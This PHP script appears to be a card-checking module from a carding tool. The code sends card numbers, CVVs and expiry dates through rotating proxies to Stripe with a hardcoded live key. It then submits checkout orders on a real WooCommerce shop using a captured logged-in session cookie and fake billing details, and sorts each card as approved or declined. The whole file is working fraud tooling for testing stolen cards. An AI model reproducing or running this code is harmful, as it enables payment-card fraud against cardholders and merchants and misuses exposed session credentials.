<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$cookie = uniqid();

$fake = $this->tools->GetUser();

$data = 'type=card&owner[name]=Jhon+Doe&owner[address][line1]=12+main+street&owner[address][state]=NY&owner[address][city]=Brewster&owner[address][postal_code]=10509&owner[address][country]=US&owner[email]=jhoncenarockz%40outlook.com&owner[phone]=2564567654&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F6aa5f07608%3B+stripe-js-v3%2F6aa5f07608&time_on_page=162003&key=pk_live_EKpDcizDcZIXRzEEiGvLhqDF';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/sources', $data, null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$src = $json_r1->id;

$headers = [
	'cookie: pysTrafficSource=google.com; pys_landing_page=https://fitnessfaqs.com/product/body-by-rings/; _gcl_au=1.1.766375321.1682041205; _fbp=fb.1.1682041206489.1942624499; _gid=GA1.2.1927115682.1682041207; __stripe_mid=d4265dc6-ca9e-471c-96c1-2d939642df404371d3; __stripe_sid=8da60ff7-a9d3-4527-8e58-2cbdee472258cb1318; mailchimp_user_email=jhoncenarockz@outlook.com; wordpress_logged_in_cbeac1a6cc939f103bfb5befcf0a76a3=jhon.doe|1713577522|TIqrXRajwzwJtJb0y5IB2MsA75WvXLQSFuVQidRjjQV|38a6228cd54d035fb248ba30ff94ef9f7cee58305647ef0682dd15663d047559; wp_woocommerce_session_cbeac1a6cc939f103bfb5befcf0a76a3=24632||1682214087||1682210487||882ca6f91dcc589a7f6cb999c8ad1b00; mailchimp_landing_site=https://fitnessfaqs.com/checkout/; pys_fb_event_id={"AddToCart":"dVNDJ7wygBo3qi4gOzqaxAkEqPvESEvV3egZ"}; _gat_gtag_UA_29172149_1=1; _ga=GA1.1.1081142823.1682041207; _ga_T6SMYSMHE2=GS1.1.1682041206.1.1.1682043028.0.0.0; woocommerce_items_in_cart=1; woocommerce_cart_hash=822902c38f717f17585f35f586ccf318; wooptpmReferrer=; gtag_logged_in=true'
];

$r2 = $this->curlx->Get('https://fitnessfaqs.com/checkout/', $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$nonce_v1 = trim(strip_tags($this->getstr($r2->body, 'woocommerce-process-checkout-nonce" value="', '"')));

if (empty($nonce_v1)) {
	$empty = 'Second Request Tokens is Empty';

	goto start;
}

$data = 'billing_first_name=Jhon&billing_last_name=Doe&billing_company=&billing_country=US&billing_address_1=12+main+street&billing_address_2=&billing_city=Brewster&billing_state=NY&billing_postcode=10509&billing_phone=2564567654&billing_email=jhoncenarockz%40outlook.com&payment_method=stripe&woocommerce-process-checkout-nonce='.$nonce_v1.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26elementor_page_id%3D601&pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&pys_browser_time=04-05%7CFriday%7CApril&pys_landing=https%3A%2F%2Ffitnessfaqs.com%2Fproduct%2Fbody-by-rings%2F&pys_source=google.com&pys_order_type=normal&stripe_source='.$src;

$r3 = $this->curlx->Post('https://fitnessfaqs.com/?wc-ajax=checkout&elementor_page_id=601', $data, null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$err = trim(strip_tags($this->getstr($r3->body, '<li>\n\t\t\t', '\t')));

$msg = empty($err) ? trim(strip_tags($this->getstr($r3->body, 'messages":"', '"'))) : $err;

$status = $this->response->Stripe($r3->body, $err);

end: